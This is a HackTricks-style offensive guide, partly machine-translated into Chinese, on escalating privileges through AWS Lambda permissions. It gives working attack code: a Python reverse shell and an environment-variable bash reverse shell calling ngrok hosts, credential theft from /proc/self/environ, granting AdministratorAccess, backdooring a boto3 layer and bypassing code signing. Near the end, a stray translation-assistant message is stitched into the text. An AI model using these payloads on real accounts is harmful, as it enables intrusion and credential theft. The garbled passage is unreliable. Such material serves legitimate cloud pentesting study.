# AWS - Lambda Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## lambda

有关 lambda 的更多信息：

{{#ref}}
../../aws-services/aws-lambda-enum.md
{{#endref}}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

拥有 **`iam:PassRole`、`lambda:CreateFunction` 和 `lambda:InvokeFunction`** 权限的用户可以提升他们的权限。\\
他们可以**创建一个新的 Lambda function 并分配一个已有的 IAM role**，从而赋予该函数与该角色关联的权限。然后用户可以**将代码写入并上传到该 Lambda function（例如包含 rev shell）**。\\
一旦该函数设置完成，用户可以通过调用 AWS API 来**触发其执行**并完成预期操作。这种方法实际上允许用户通过 Lambda function 间接执行任务，使用与该 IAM role 关联的权限等级来运行。\\

攻击者可以滥用此方法获取 **rev shell 并窃取 token**：
```python:rev.py
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```

```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
你也可以从 lambda function 本身 **abuse the lambda role permissions**.\
如果 lambda role 拥有足够的 permissions，你可以使用它来授予你 admin rights:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
也可以在不需要外部连接的情况下 leak the lambda's role credentials。对于用于内部任务的 **Network isolated Lambdas** 来说这将非常有用。如果有未知的安全组在过滤你的 reverse shells，这段代码将允许你将 credentials 作为 lambda 的输出直接 leak。
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**潜在影响：** 直接 privesc 到指定的任意 lambda 服务角色。

> [!CAUTION]
> 注意，尽管看起来可能很有吸引力，**`lambda:InvokeAsync`** 本身**并不**允许 **执行 `aws lambda invoke-async`**，你还需要 `lambda:InvokeFunction`

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

像在之前的情形一样，你可以**授予自己 `lambda:InvokeFunction` 权限**，如果你拥有权限 **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potential Impact:** 直接对指定的任意 lambda 服务角色实现 privesc。

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Users with **`iam:PassRole`, `lambda:CreateFunction`, and `lambda:CreateEventSourceMapping`** permissions (and potentially `dynamodb:PutItem` and `dynamodb:CreateTable`) can indirectly **escalate privileges** even without `lambda:InvokeFunction`.\
他们可以创建一个包含恶意代码的 **Lambda function 并将其分配给一个现有的 IAM role**。

用户并非直接调用 Lambda，而是设置或利用现有的 DynamoDB 表，通过 event source mapping 将其与 Lambda 关联。该配置确保当表中插入新条目时 **会自动触发 Lambda function**（由用户的操作或其他进程触发），从而间接调用 Lambda 并以所传 IAM role 的权限执行代码。
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
如果 DynamoDB 已经在 AWS 环境中启用，用户只需要为 Lambda function 建立 **event source mapping**。但是，如果 DynamoDB 未在使用，用户必须 **create a new table** 并启用 streaming：
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
现在可以**connect the Lambda function to the DynamoDB table**，方法是**creating an event source mapping**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
当 Lambda 函数与 DynamoDB 流关联时，攻击者可以**通过激活 DynamoDB 流来间接触发 Lambda**。这可以通过向 DynamoDB 表中**插入一条记录**来实现：
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**潜在影响：** 直接对指定的 lambda 服务角色 进行 privesc。

### `lambda:AddPermission`

拥有此权限的攻击者可以 **授予自己（或其他人）任何权限**（这会生成基于资源的策略来授予对该资源的访问）：
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
**潜在影响：** 通过授予修改代码并运行代码的权限，可直接对 lambda 服务角色实现 privesc。

### `lambda:AddLayerVersionPermission`

拥有此权限的攻击者可以 **授予自己（或他人）`lambda:GetLayerVersion` 权限**。他可以访问 layer 并查找漏洞或敏感信息。
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Potential Impact:** 可能访问敏感信息。

### `lambda:UpdateFunctionCode`

拥有 **`lambda:UpdateFunctionCode`** 权限的用户有可能 **修改与 IAM role 关联的现有 Lambda function 的代码。**\
攻击者可以 **修改 lambda 的代码以 exfiltrate IAM credentials**。

尽管攻击者可能没有直接能力去 invoke the function，但如果该 Lambda function 已存在且正在运行，很可能会通过现有的工作流或事件被触发，从而间接促成被修改代码的执行。
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
**Potential Impact:** 直接对所使用的 lambda 服务角色进行 privesc。

### `lambda:UpdateFunctionConfiguration`

#### RCE via env variables

拥有此权限可以添加环境变量，导致 Lambda 执行任意代码。 例如在 python 中，可以滥用环境变量 `PYTHONWARNING` 和 `BROWSER` 使 python 进程执行任意命令：
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
对于其他脚本语言，你可以使用其他环境变量。更多信息请查看以下关于脚本语言的子章节：

{{#ref}}
https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/index.html
{{#endref}}

#### RCE 通过 Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) 允许在你的 lamdba 函数中包含 **code**，但将其 **单独存储**，因此函数代码可以保持精简，并且 **多个函数可以共享 code**。

在 lambda 内，你可以用类似下面的函数检查加载 python code 的路径：
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
These are the places:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

For example, the library boto3 is loaded from `/var/runtime/boto3` (4th position).

#### Exploitation

可以滥用权限 `lambda:UpdateFunctionConfiguration` 来**向某个 lambda 函数添加新的 layer**。为了执行任意代码，该 layer 需要包含一些该 lambda 将要导入的**库**。如果你可以读取该 lambda 的代码，就可以很容易找到这些信息；另外请注意，lambda 可能**已经在使用某个 layer**，你可以**下载**该 layer 并**在其中添加你的代码**。

例如，假设该 lambda 正在使用库 boto3，这将创建一个包含该库最新版本的本地 layer：
```bash
pip3 install -t ./lambda_layer boto3
```
你可以打开 `./lambda_layer/boto3/__init__.py` 并 **在全局代码中添加 backdoor**（例如：一个用来 exfiltrate credentials 或获取 reverse shell 的函数）。

然后，将该 `./lambda_layer` 目录打包为 zip 并 **上传新的 lambda layer** 到你自己的账户（或受害者的账户，但你可能没有该权限）。\
注意：你需要创建一个 python 文件夹并把库放进去以覆盖 /opt/python/boto3。此外，layer 必须 **与 lambda 使用的 python 版本兼容**，如果你把它上传到自己的账户，也必须在 **同一 区域:**
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
现在，使上传的 lambda layer **对任何账户可访问**：
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
并将 lambda layer 附加到 victim lambda function:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
下一步要么我们自己**调用该函数**（如果可以），要么等待它按正常方式**被调用**——这是更安全的方法。

一种**更隐蔽的利用此漏洞的方法**可以在以下位置找到：

{{#ref}}
../../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md
{{#endref}}

**潜在影响：** 直接 privesc 到所使用的 lambda 服务角色。

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

也许有了这些权限你可以创建函数并通过调用 URL 来执行它……但我找不到测试方法，如果你成功了请告诉我！

### Lambda MitM

有些 lambdas 会**在参数中接收来自用户的敏感信息。**如果在其中一个获得 RCE，你可以 exfiltrate 其他用户发送给它的信息，查看：

{{#ref}}
../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md
{{#endref}}

## References

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{{#include ../../../../banners/hacktricks-training.md}}




### `lambda:DeleteFunctionCodeSigningConfig` or `lambda:PutFunctionCodeSigningConfig` + `lambda:UpdateFunctionCode` — Bypass Lambda Code Signing

如果 Lambda 函数强制执行代码签名，攻击者如果可以移除 Code Signing Config (CSC) 或将其降级为 `WARN`，则可以向函数部署未签名代码。这样可以在不修改函数的 IAM role 或 触发器 的情况下绕过完整性保护。

Permissions (one of):
- Path A: `lambda:DeleteFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`
- Path B: `lambda:CreateCodeSigningConfig`, `lambda:PutFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`

Notes:
- For Path B, you don't need an AWS Signer profile if the CSC policy is set to `WARN` (unsigned artifacts allowed).

Steps (REGION=us-east-1, TARGET_FN=<target-lambda-name>):

Prepare a small payload:
```bash
cat > handler.py <<'PY'
import os, json
def lambda_handler(event, context):
return {"pwn": True, "env": list(os.environ)[:6]}
PY
zip backdoor.zip handler.py
```
路径 A) 删除 CSC 然后更新代码：
```bash
aws lambda get-function-code-signing-config --function-name $TARGET_FN --region $REGION && HAS_CSC=1 || HAS_CSC=0
if [ "$HAS_CSC" -eq 1 ]; then
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION
fi
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Path B) 降级为 Warn 并更新代码 (如果不允许删除):
```bash
CSC_ARN=$(aws lambda create-code-signing-config \
--description ht-warn-csc \
--code-signing-policies UntrustedArtifactOnDeployment=WARN \
--query CodeSigningConfig.CodeSigningConfigArn --output text --region $REGION)
aws lambda put-function-code-signing-config --function-name $TARGET_FN --code-signing-config-arn $CSC_ARN --region $REGION
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
确认：我会将指定文件中的相关英文翻译为中文，保持原有的 Markdown 和 HTML 语法、标签和路径完全不变。不会翻译代码、黑客技术名称、常见黑客词、云/SaaS 平台名（如 Workspace、aws、gcp 等）、单词 "leak"、pentesting、链接或路径，也不会修改 {#tabs}、{#tab}、{#ref}...{#endref} 等标签。不会添加额外内容。请提供 README.md 的内容以便翻译。
```bash
aws lambda invoke --function-name $TARGET_FN /tmp/out.json --region $REGION >/dev/null
cat /tmp/out.json
```
潜在影响：能够将任意未签名的 code 推送并在本应强制使用签名部署的函数中运行，可能导致以该函数角色的权限执行 code。

清理：
```bash
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION || true
```

